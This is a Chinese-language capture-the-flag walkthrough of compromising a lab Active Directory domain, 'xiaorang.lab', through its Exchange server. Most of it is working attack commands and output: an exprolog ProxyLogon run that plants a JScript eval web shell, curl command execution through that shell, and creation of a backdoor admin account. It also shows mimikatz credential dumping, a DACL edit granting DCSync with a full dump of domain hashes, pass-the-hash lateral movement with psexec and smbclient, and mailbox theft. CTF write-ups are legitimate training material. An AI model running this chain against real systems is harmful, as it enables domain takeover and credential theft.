发现的网络接口:
   IPv4地址:
      └─ 172.22.3.26
[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         Windows Server 2016 Datacenter 14393
[2025-04-09 00:55:42] [SUCCESS] SMTP服务 172.22.3.9:25 允许匿名访问
[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9        状态码:302 长度:0      标题:无标题 重定向地址: https://172.22.3.9/owa/
[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&reason=0 状态码:200 长度:28237  标题:Outlook
[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9:8172   状态码:404 长度:0      标题:无标题
```

扫到三台机子

```
172.22.3.9 XIAORANG-EXC01
172.22.3.2  DC:XIAORANG-WIN16.xiaorang.lab
172.22.3.26 XIAORANG-PC
```



172.22.3.9上有一个exchange服务，有nday，直接上exprolog

```cmd
python .\exprolog.py -t 172.22.3.9 -e administrator@xiaorang.lab

___________      __________               .__
\_   _____/__  __\______   \_______  ____ |  |   ____   ____
 |    __)_\  \/  /|     ___/\_  __ \/  _ \|  |  /  _ \ / ___\
 |        \>    < |    |     |  | \(  <_> )  |_(  <_> ) /_/  >
/_______  /__/\_ \|____|     |__|   \____/|____/\____/\___  /
        \/      \/                                   /_____/

[#] Trying to get target FQDN
[+] Got target FQDN: XIAORANG-EXC01
[#] Trying to get target LegacyDN and ServerID
[+] Got target LegacyDN: /o=XIAORANG LAB/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=8ca6ff254802459d9f63ee916eabb487-Administrat
[+] Got target ServerID: b5ebdaa1-b4b3-4b71-ab32-7d03b4955a75
[#] Trying to get target user SID
[+] Got target administrator SID: S-1-5-21-533686307-2117412543-4200729784-500
[#] Trying to get target administrator cookie sessions
[+] Got target administrator session ID: fefab382-b49c-4a85-a748-8cee14485956
[+] Got target administrator canary session ID: atsaGpfQ70qSuQAOEtYUV5LqJeTxeN0IkjUqGKytbR0zbRHwhB5ynGGNyD8fBXd6AyUH2qDHj9M.
[#] Trying to get target OABVirtualDirectory ID
[+] Got target AOB ID: 6d8fb74b-8477-43ee-83ba-0b119205e85f
[#] Trying to inject OABVirtualDirectory Shell
[+] Shell are injected
[#] Verifying OABVirtualDirectory Shell
[+] AOB Shell verified
[+] AOB Shell payload: http:\/\/ooo\/#%3Cscript%20language=%22JScript%22%20runat=%22server%22%3Efunction%20Page_Load()%7Beval(Request%5B%22request%22%5D,%22unsafe%22);%7D%3C\/script%3E
[#] Trying to export OABVirtualDirectory Shell
[+] Shell are exported
[*] CURL Request:
curl --request POST --url https://172.22.3.9/owa/auth/pjo2b.aspx --header 'Content-Type: application/x-www-form-urlencoded' --data 'request=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami /all").stdout.readall())' -k
[*] DONE
```

发现可以RCE

```
proxychains4 curl --request POST --url https://172.22.3.9/owa/auth/pjo2b.aspx --header 'Content-Type: application/x-www-form-urlencoded' --data 'request=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").stdout.readall())' -k
```

写用户RDP上去拿flag

```
net user xrntkk abc123456 /add
net localgroup administrators xrntkk /add
```

![image-20250409203509023](../assets/image-20250409203509023.png)



```cmd
Yb  dP 88    db     dP"Yb  88""Yb    db    88b 88  dP""b8 
 YbdP  88   dPYb   dP   Yb 88__dP   dPYb   88Yb88 dP   `" 
 dPYb  88  dP__Yb  Yb   dP 88"Yb   dP__Yb  88 Y88 Yb  "88 
dP  Yb 88 dP""""Yb  YbodP  88  Yb dP""""Yb 88  Y8  YboodP 


    / /                                        
   / /                  _   __     ( )  ___    
  / /        //   / / // ) )  ) ) / / //   ) ) 
 / /        //   / / // / /  / / / / //   / /  
/ /____/ / ((___( ( // / /  / / / / ((___( (   



flag02: flag{aefcc6d0-0d3c-44aa-b96c-c8ad50e6d2d4}

```



### FLAG4

信息收集一手

这是域内的一台机子

![image-20250409203726645](../assets/image-20250409203726645.png)

接着传个mimikatz，抓取哈希

用管理员打开mimikatz

```
log
privilege::Debug 
sekurlsa::logonpasswords 
exit
```

抓到两个hash

一个是机器用户的hash，一个是用户zhangtong

```
Authentication Id : 0 ; 10480581 (00000000:009febc5)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2025/4/9 20:32:31
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * NTLM     : 9b2081c3dc250a9b0a55c54c4dcc9cbb
         * SHA1     : 336d62cd7f3bc62aba936763ace82491e96f2eed
         
         
Authentication Id : 0 ; 105924 (00000000:00019dc4)
Session           : Service from 0
User Name         : Zhangtong
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2025/4/9 19:36:36
SID               : S-1-5-21-533686307-2117412543-4200729784-1147
        msv :
         [00000003] Primary
         * Username : Zhangtong
         * Domain   : XIAORANG
         * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
         * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
         * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b

```

接下来利用system权限用bloodhound信息收集一波

```
proxychains4 bloodhound-python -u "XIAORANG-EXC01$" --hashes :9b2081c3dc250a9b0a55c54c4dcc9cbb -d xiaorang.lab -dc XIAORANG-WIN16.xiaorang.lab -c all --dns-tcp -ns 172.22.3.2 --auth-method ntlm --zip
```

![image-20250409212457772](../assets/image-20250409212457772.png)

发现这台机子对域内的用户具有WriteDACL权限，也就是说我们可以利用机器用户给域内的用户添加dcsync权限，从而拿到域管的hash。

```
python dacledit.py xiaorang.lab/XIAORANG-EXC01$ -hashes :9b2081c3dc250a9b0a55c54c4dcc9cbb -action write -rights DCSync -principal XIAORANG-EXC01$ -target-dn "DC=xiaorang,DC=lab" -dc-ip 172.22.3.2
```

![image-20250409213411858](../assets/image-20250409213411858.png)

接下来我们就可以利用dcsync去dump域管的hash了

```
proxychains4 python3 psexec.py xiaorang.lab/XIAORANG-EXC01\$@172.22.3.9 -hashes ':9b2081c3dc250a9b0a55c54c4dcc9cbb' -codec gbk
```

```
c:\> .\mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] 'xiaorang.lab' will be the domain
[DC] 'XIAORANG-WIN16.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  b8fa79a52e918cb0cbcd1c0ede492647        514
1137    HealthMailboxeda7a84    1e89e23e265bb7b54dc87938b1b1a131        66048
1138    HealthMailbox33b01cf    0eff3de35019c2ee10b68f48941ac50d        66048
1139    HealthMailbox9570292    e434c7db0f0a09de83f3d7df25ec2d2f        66048
1140    HealthMailbox3479a75    c43965ecaa92be22c918e2604e7fbea0        66048
1141    HealthMailbox2d45c5b    4822b67394d6d93980f8e681c452be21        66048
1142    HealthMailboxec2d542    147734fa059848c67553dc663782e899        66048
1143    HealthMailboxf5f7dbd    e7e4f69b43b92fb37d8e9b20848e6b66        66048
1144    HealthMailbox67dc103    4fe68d094e3e797cfc4097e5cca772eb        66048
1145    HealthMailbox320fc73    0c3d5e9fa0b8e7a830fcf5acaebe2102        66048
1146    Lumia   862976f8b23c13529c2fb1428e710296        512
500     Administrator   7acbc09a6c0efd81bfa7d5a1d4238beb        512
1000    XIAORANG-WIN16$ 5410e4604b240a6d7bab43f67637b109        532480
1147    Zhangtong       22c7f81993e96ac83ac2f3f1903de8b4        512
1103    XIAORANG-EXC01$ 9b2081c3dc250a9b0a55c54c4dcc9cbb        4096
1104    XIAORANG-PC$    fc840d385551c896c88c32a65ab5c5ad        4096
1135    HealthMailbox8446c5b    a79a671473279d21ca92fcc8251ec143        66048
1136    HealthMailbox0d5918e    0e9b8e002d34d405e866b4820dfe36eb        66048

mimikatz(commandline) # exit
Bye!
```

拿到域管hash，那我们接下来就可以随意横向了

```
500     Administrator   7acbc09a6c0efd81bfa7d5a1d4238beb        512
```

横向拿flag

```
 proxychains4 python3 psexec.py administrator@172.22.3.2 -hashes ':7acbc09a6c0efd81bfa7d5a1d4238beb' -codec gbk
```

```
c:\Users\Administrator\flag> type flag.txt
____  ___.___   _____   ________ __________    _____    _______    ________
\   \/  /|   | /  _  \  \_____  \\______   \  /  _  \   \      \  /  _____/
 \     / |   |/  /_\  \  /   |   \|       _/ /  /_\  \  /   |   \/   \  ___
 /     \ |   /    |    \/    |    \    |   \/    |    \/    |    \    \_\  \
/___/\  \|___\____|__  /\_______  /____|_  /\____|__  /\____|__  /\______  /
      \_/            \/         \/       \/         \/         \/        \/



flag04: flag{204e2d62-c729-4840-8b25-a6c07b6aad44}
```

拿到flag4

### FLAG3

接下来横向去26拿flag3

```
proxychains4 impacket-smbclient -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.26 -dc-ip 172.22.3.2
```

```
use C$
cd /users/lumia/desktop
```

在C:\users\lumia\desktop找到一个secret.zip，我们把它get下来

![image-20250409223522418](../assets/image-20250409223522418.png)

![image-20250409224258513](../assets/image-20250409224258513.png)

secret.zip里面有个flag.docx

但是secret.zip需要密码

这里要利用上面拿到的lumia的hash，将outlook中的邮件下载下来

```
1146    Lumia   862976f8b23c13529c2fb1428e710296        512
```

```
python pthexchange.py --target https://172.22.3.9 --username Lumia --password "00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296" --action Download
```

![image-20250409225130259](../assets/image-20250409225130259.png)

拿到两封邮件

![image-20250409225219564](../assets/image-20250409225219564.png)

第一封附件是刚刚的secret.zip，提示说用手机号解密

第二封邮件中附件是一堆名字和手机号

我们用手机号作为字典进行爆破

![image-20250409225625842](../assets/image-20250409225625842.png)

```
18763918468
```

拿到flag3

![image-20250409225723235](../assets/image-20250409225723235.png)
